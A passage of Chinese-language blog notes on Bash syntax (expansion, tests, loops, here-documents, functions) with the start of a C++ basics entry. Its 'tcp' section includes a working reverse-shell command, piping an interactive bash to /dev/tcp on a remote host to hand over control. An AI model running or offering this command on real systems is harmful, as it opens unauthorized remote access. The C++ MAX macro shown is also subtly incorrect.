<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$&#123;A-B&#125;, $&#123;A:-B&#125;</code></td>
<td align="left">A有值 ? 返回A : 返回B</td>
</tr>
<tr>
<td align="left"><code>$&#123;A=B&#125;, $&#123;A:=B&#125;</code></td>
<td align="left">A有值 ? 返回A : 将A值设置为B后返回A</td>
</tr>
<tr>
<td align="left"><code>$&#123;A+B&#125;, $&#123;A:+B&#125;</code></td>
<td align="left">A有值 ? 返回B : 返回空字符串</td>
</tr>
<tr>
<td align="left"><code>$&#123;A?err_msg&#125;, $&#123;A:?err_msg&#125;</code></td>
<td align="left">A有值 ? 返回A : 终止脚本并打印err_msg，退出状态<code>$?</code>为1</td>
</tr>
</tbody></table>
<h2 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h2><ul>
<li>命令代换（command substitution）使用后引号（backquotes，``），用于将命令的输出插入上下文中</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="built_in">pwd</span>` <span class="comment"># /root</span></span><br></pre></td></tr></table></figure>

<h2 id="算术展开"><a href="#算术展开" class="headerlink" title="算术展开"></a>算术展开</h2><p><a href="https://tldp.org/LDP/abs/html/arithexp.html">Advanced Bash-Scripting Guide: Arithmetic Expansion</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=1</span><br><span class="line">b=`<span class="built_in">expr</span> <span class="variable">$a</span> + 2`</span><br><span class="line">c=$((<span class="variable">$b</span>+<span class="number">3</span>))</span><br><span class="line">d=$((<span class="variable">$c</span>+<span class="number">4</span>))</span><br><span class="line">((e = d + <span class="number">5</span>))</span><br><span class="line"><span class="built_in">let</span> f=e+6</span><br><span class="line"><span class="built_in">let</span> <span class="string">&quot;g = f + 7&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> <span class="variable">$b</span> <span class="variable">$c</span> <span class="variable">$d</span> <span class="variable">$e</span> <span class="variable">$f</span> <span class="variable">$g</span> <span class="comment"># 1 3 6 10 15 21 28</span></span><br></pre></td></tr></table></figure>

<h2 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h2><ul>
<li><code>eval var=\$$var</code>语法可以获取到var变量的值（又被作为变量解析）的值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=b</span><br><span class="line">b=12</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> \$<span class="variable">$a</span> <span class="comment"># b $b</span></span><br><span class="line"><span class="built_in">eval</span> a=\$<span class="variable">$a</span>  <span class="comment"># (Indirect reference)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> \$<span class="variable">$a</span> <span class="comment"># 12 $12</span></span><br></pre></td></tr></table></figure>

<h1 id="测试条件"><a href="#测试条件" class="headerlink" title="测试条件"></a>测试条件</h1><h2 id="数值比较"><a href="#数值比较" class="headerlink" title="数值比较"></a>数值比较</h2><table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>[ &quot;$a&quot; -eq &quot;$b&quot; ]</code></td>
<td align="left">a等于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; -ne &quot;$b&quot; ]</code></td>
<td align="left">a不等于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; -gt &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &gt; &quot;$b&quot;))</code></td>
<td align="left">a大于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; -ge &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &gt;= &quot;$b&quot;))</code></td>
<td align="left">a大于或等于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; -lt &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &lt; &quot;$b&quot;))</code></td>
<td align="left">a小于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; -le &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &lt;= &quot;$b&quot;))</code></td>
<td align="left">a小于或等于b?</td>
</tr>
</tbody></table>
<h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>[ &quot;$a&quot; = &quot;$b&quot; ]</code><br><code>[ &quot;$a&quot; == &quot;$b&quot; ]</code></td>
<td align="left">a等于b?</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$a&quot; != &quot;$b&quot; ]</code></td>
<td align="left">a不等于b?</td>
</tr>
<tr>
<td align="left"><code>[[ &quot;$a&quot; &lt; &quot;$b&quot; ]]</code></td>
<td align="left">a小于b（ASCII alphabetical order）?</td>
</tr>
<tr>
<td align="left"><code>[[ &quot;$a&quot; &gt; &quot;$b&quot; ]]</code></td>
<td align="left">a大于b（ASCII alphabetical order）?</td>
</tr>
<tr>
<td align="left"><code>[ -z &quot;$a&quot; ]</code></td>
<td align="left">a为空字符串?</td>
</tr>
<tr>
<td align="left"><code>[ -n &quot;$a&quot; ]</code></td>
<td align="left">a为非空字符串?</td>
</tr>
</tbody></table>
<h2 id="逻辑比较"><a href="#逻辑比较" class="headerlink" title="逻辑比较"></a>逻辑比较</h2><table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>[ &quot;$expr1&quot; -a &quot;$expr2&quot; ]</code><br><code>[[ condition1 &amp;&amp; condition2 ]]</code></td>
<td align="left">logical and</td>
</tr>
<tr>
<td align="left"><code>[ &quot;$expr1&quot; -o &quot;$expr2&quot; ]</code><br><code>[[ condition1 || condition2 ]]</code></td>
<td align="left">logical or</td>
</tr>
</tbody></table>
<h2 id="文件测试"><a href="#文件测试" class="headerlink" title="文件测试"></a>文件测试</h2><table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>[ -e /a/b ]</code><br><code>[ -a /a/b ]</code></td>
<td align="left">文件存在?</td>
</tr>
<tr>
<td align="left"><code>[ -f /a/b ]</code></td>
<td align="left">常规文件（非目录或设备）?</td>
</tr>
<tr>
<td align="left"><code>[ -s /a/b ]</code></td>
<td align="left">文件大小不等于0?</td>
</tr>
<tr>
<td align="left"><code>[ -d /a/b ]</code></td>
<td align="left">目录文件?</td>
</tr>
<tr>
<td align="left"><code>[ -b /a/b ]</code></td>
<td align="left">块（block）设备?</td>
</tr>
<tr>
<td align="left"><code>[ -c /dev/sda ]</code></td>
<td align="left">字符（character）设备?</td>
</tr>
<tr>
<td align="left"><code>[ -p /dev/fd/0 ]</code></td>
<td align="left">pipe file?</td>
</tr>
<tr>
<td align="left"><code>[ -h /a/b ]</code><br><code>[ -L /a/b ]</code></td>
<td align="left">symbolic link?</td>
</tr>
<tr>
<td align="left"><code>[ -S /a/b ]</code></td>
<td align="left">socket file?</td>
</tr>
</tbody></table>
<h1 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h1><h2 id="循环体"><a href="#循环体" class="headerlink" title="循环体"></a>循环体</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><div class="tabs" id="bashfor"><ul class="nav-tabs"><li class="tab active"><a href="#bashfor-1">General</a></li><li class="tab"><a href="#bashfor-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashfor-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..100&#125;; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfor-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">for</span> ((a=<span class="number">1</span>, b=<span class="number">1</span>; a &lt;= LIMIT ; a++, b++)); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span>-<span class="variable">$b</span> &quot;</span> <span class="comment"># 1-1 2-2 3-3 </span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><div class="tabs" id="bashwhile"><ul class="nav-tabs"><li class="tab active"><a href="#bashwhile-1">General</a></li><li class="tab"><a href="#bashwhile-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashwhile-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$a</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$LIMIT</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashwhile-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">((a = <span class="number">0</span>))</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">while</span> (( a &lt; LIMIT )); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  ((a += <span class="number">1</span>))    <span class="comment"># let &quot;a+=1&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><div class="tabs" id="bashuntil"><ul class="nav-tabs"><li class="tab active"><a href="#bashuntil-1">General</a></li><li class="tab"><a href="#bashuntil-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashuntil-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">until</span> [ <span class="string">&quot;<span class="variable">$a</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$LIMIT</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  <span class="built_in">let</span> <span class="string">&quot;a+=1&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashuntil-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">((a = <span class="number">0</span>))</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">until</span> (( a &gt;= LIMIT )); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  ((a += <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><ul>
<li><code>break [N]</code>支持跳出多层循环，默认N&#x3D;1</li>
</ul>
<div class="tabs" id="loopbreak"><ul class="nav-tabs"><li class="tab active"><a href="#loopbreak-1">TermInnermostLoop</a></li><li class="tab"><a href="#loopbreak-2">OutOfNLevelsOfLoop</a></li></ul><div class="tab-content"><div class="tab-pane active" id="loopbreak-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">break</span> <span class="comment"># [1] 1 2 </span></span><br><span class="line">            <span class="comment"># [2] 1 2 </span></span><br><span class="line">            <span class="comment"># [3] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="loopbreak-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">break</span> 2 <span class="comment"># [1] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><ul>
<li><code>continue [N]</code>支持跳到外部循环执行点继续执行，默认N&#x3D;1</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">continue</span> 2 <span class="comment"># [1] 1 2 [2] 1 2 [3] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h2><h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><ul>
<li>case结构类似于c语言中的switch</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> Keypress</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$Keypress</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  [[:lower:]] ) <span class="built_in">echo</span> <span class="string">&quot;Lowercase letter&quot;</span>;;</span><br><span class="line">  [[:upper:]] ) <span class="built_in">echo</span> <span class="string">&quot;Uppercase letter&quot;</span>;;</span><br><span class="line">  [0-9]       ) <span class="built_in">echo</span> <span class="string">&quot;Digit&quot;</span>;;</span><br><span class="line">  *           ) <span class="built_in">echo</span> <span class="string">&quot;Punctuation, whitespace, or other&quot;</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> item <span class="keyword">in</span> <span class="string">&quot;a&quot;</span> <span class="string">&quot;b&quot;</span> <span class="string">&quot;c&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Select: <span class="variable">$item</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line">  <span class="built_in">break</span>  <span class="comment"># break语句使得在用户选择后跳出select</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output]</span></span><br><span class="line"><span class="comment">#  1) a</span></span><br><span class="line"><span class="comment">#  2) b</span></span><br><span class="line"><span class="comment">#  3) c</span></span><br><span class="line"><span class="comment">#  #? 2</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  Select: b</span></span><br></pre></td></tr></table></figure>

<h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="HereDocument"><a href="#HereDocument" class="headerlink" title="HereDocument"></a>HereDocument</h2><ul>
<li>HereDocument是一种专用代码块，将命令列表（command list）以I&#x2F;O重定向的方式提供给程序或命令，格式如下  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interactive-program &lt;&lt;<span class="string">LimitString</span></span><br><span class="line"><span class="string">command #1</span></span><br><span class="line"><span class="string">command #2</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">LimitString</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;&lt;-LimitString</code>可以抑制前导制表符（\t）打印（不适用space）</li>
<li><code>&lt;&lt;\LimitString</code>、<code>&lt;&lt;&#39;LimitString&#39;</code>、<code>&lt;&lt;&quot;LimitString&quot;</code>可以禁用参数代换</li>
</ul>
</li>
</ul>
<div class="tabs" id="bashheredocument"><ul class="nav-tabs"><li class="tab active"><a href="#bashheredocument-1">BroadcastMessage</a></li><li class="tab"><a href="#bashheredocument-2">GenerateScript</a></li><li class="tab"><a href="#bashheredocument-3">Anonymous</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashheredocument-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wall &lt;&lt;<span class="string">EndOfMessage</span></span><br><span class="line"><span class="string">Hi! # Note: &#x27;wall&#x27; prints comment lines.</span></span><br><span class="line"><span class="string">EndOfMessage</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashheredocument-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">OUTFILE=a.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note that since we are inside a subshell,</span></span><br><span class="line">(</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Parameter expansion has been disabled.</span></span><br><span class="line"><span class="comment"># Instead, the result is literal output.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Generated file will be named: <span class="variable">$OUTFILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">a=7</span><br><span class="line">b=3</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> <span class="string">&quot;c = <span class="variable">$a</span> * <span class="variable">$b</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;c = <span class="variable">$c</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">EOF</span><br><span class="line">) &gt; <span class="variable">$OUTFILE</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashheredocument-3"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">: &lt;&lt;<span class="string">TESTVARIABLES</span></span><br><span class="line"><span class="string">$&#123;HOST_NAME?&#125;$&#123;USER?&#125;$&#123;MAIL?&#125;  # Print error message if one of the variables not set.</span></span><br><span class="line"><span class="string">TESTVARIABLES</span></span><br><span class="line"><span class="comment"># ./here.sh: line 3: HOST_NAME: parameter not set</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul>
<li>支持间接传递变量的值（第一个变量的值用作第二个变量的名字）(IndirectReference)</li>
<li>支持在函数内部根据变量的名称获取变量的值（Dereference）</li>
<li>支持本地变量，其作用域只在函数内部有效（LocalVariable）</li>
<li>支持递归调用（Recursive）</li>
</ul>
<div class="tabs" id="bashfunction"><ul class="nav-tabs"><li class="tab active"><a href="#bashfunction-1">IndirectReference</a></li><li class="tab"><a href="#bashfunction-2">DereferenceParameter</a></li><li class="tab"><a href="#bashfunction-3">LocalVariable</a></li><li class="tab"><a href="#bashfunction-4">Recursive</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashfunction-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">greet</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message=Hello</span><br><span class="line">Hello=Goodbye</span><br><span class="line"></span><br><span class="line">greet <span class="string">&quot;<span class="variable">$message</span>&quot;</span>    <span class="comment"># Hello</span></span><br><span class="line">greet <span class="string">&quot;<span class="variable">$&#123;!message&#125;</span>&quot;</span> <span class="comment"># Goodbye (indirect reference)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">dereference</span></span> () &#123;</span><br><span class="line">  name=\$<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$name</span>      <span class="comment"># $Junk</span></span><br><span class="line"></span><br><span class="line">  value=`<span class="built_in">eval</span> <span class="string">&quot;expr \&quot;<span class="variable">$name</span>\&quot; &quot;</span>`</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$1</span>=<span class="variable">$value</span>  <span class="comment"># Junk=A</span></span><br><span class="line">  <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$1</span>=\&quot;B\&quot;&quot;</span> <span class="comment"># (assign new value)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Junk=<span class="string">&quot;A&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[1]&quot;</span> <span class="variable">$Junk</span> <span class="comment"># [1] A</span></span><br><span class="line"></span><br><span class="line">dereference Junk</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[2]&quot;</span> <span class="variable">$Junk</span> <span class="comment"># [2] B</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-3"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">func</span></span> () &#123;</span><br><span class="line">  <span class="built_in">local</span> a=1   <span class="comment"># (local variable)</span></span><br><span class="line">  b=2         <span class="comment"># (global variable)</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[func] \&quot;a\&quot;=<span class="variable">$a</span>&quot;</span> <span class="comment"># [func] &quot;a&quot;=1</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[func] \&quot;b\&quot;=<span class="variable">$b</span>&quot;</span> <span class="comment"># [func] &quot;b&quot;=2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[out] \&quot;a\&quot;=<span class="variable">$a</span>&quot;</span> <span class="comment"># [out] &quot;a&quot;=  (not visible)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[out] \&quot;b\&quot;=<span class="variable">$b</span>&quot;</span> <span class="comment"># [out] &quot;b&quot;=2 (visible)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfunction-4"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">factorial</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> number=<span class="variable">$1</span>       <span class="comment"># (must be declared as local)</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$number</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    fact=1</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;decrnum = number - 1&quot;</span></span><br><span class="line">    factorial <span class="variable">$decrnum</span>  <span class="comment"># (recursive)</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;fact = <span class="variable">$number</span> * $?&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">return</span> <span class="variable">$fact</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Factorial of <span class="variable">$1</span> is $?.&quot;</span></span><br><span class="line"><span class="comment"># Factorial of 5 is 120.</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><h3 id="RANDOM"><a href="#RANDOM" class="headerlink" title="$RANDOM"></a><code>$RANDOM</code></h3><ul>
<li><code>$RANDOM</code> 返回一个[0, 32767]范围内的伪随机整数</li>
</ul>
<h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h2><p><a href="https://tylersguides.com/guides/check-if-a-tcp-port-is-listening-in-bash">Check if a TCP Port is Listening in Bash</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[server]</span><br><span class="line">nc -l -p 8080</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.5.5/8080 0&gt;&amp;1  本地输入只回显，接收远端输入（看远端操作）</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.5.5/8080 0&gt;&amp;1 将所有交互展示在远端（远程控制）</span><br></pre></td></tr></table></figure>

<h1 id="执行选项"><a href="#执行选项" class="headerlink" title="执行选项"></a>执行选项</h1><ul>
<li>选项（option）可以改变shell脚本的行为，通过<code>set</code>命令启用（<code>-</code>前缀）或关闭（<code>+</code>前缀），例如<code>set -x</code></li>
<li>脚本内可以通过<code>$-</code>查看启用的所有选项</li>
</ul>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-n</td>
<td align="left">读取脚本中命令，但不执行它们（语法检查）</td>
</tr>
<tr>
<td align="left">-x</td>
<td align="left">在执行之前将命令本身输出到stdout</td>
</tr>
</tbody></table>
<h1 id="外部命令"><a href="#外部命令" class="headerlink" title="外部命令"></a>外部命令</h1><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><ul>
<li>sed (stream editor)</li>
</ul>
<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><ul>
<li>awk是一种功能齐全的文本处理语言，语法类似C语言</li>
</ul>
<div class="tabs" id="bashcommandawk"><ul class="nav-tabs"><li class="tab active"><a href="#bashcommandawk-1">PrintColume</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashcommandawk-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> <span class="comment"># one two</span></span><br><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="comment"># one</span></span><br><span class="line"><span class="built_in">echo</span> one two | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> <span class="comment"># two</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[0] <a href="https://tldp.org/LDP/abs/html/index.html">Advanced Bash-Scripting Guide</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Bash</category>
      </categories>
      <tags>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title>C++基础</title>
    <url>/ProgrammingLanguage/CPP/Basic.html</url>
    <content><![CDATA[<p>CPP基础语法梳理。</p>
<span id="more"></span>

<h1 id="宏（Macro）"><a href="#宏（Macro）" class="headerlink" title="宏（Macro）"></a>宏（Macro）</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX ((a &gt; b) ? (a) : (b))</span></span><br></pre></td></tr></table></figure>

<h1 id="关键字（keyword）"><a href="#关键字（keyword）" class="headerlink" title="关键字（keyword）"></a>关键字（keyword）</h1><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><h1 id="类型（Type）"><a href="#类型（Type）" class="headerlink" title="类型（Type）"></a>类型（Type）</h1><h2 id="typeid"><a href="#typeid" class="headerlink" title="typeid"></a>typeid</h2><p>typeid操作符（operator）用于查询类型的信息（std::type_info），参数支持类型（type）和表达式（expression）形式。</p>
<ul>
<li>typeid获取的是静态类型信息，因此通过多态对象的基类指针获取的类型信息不一定是准确的</li>
</ul>
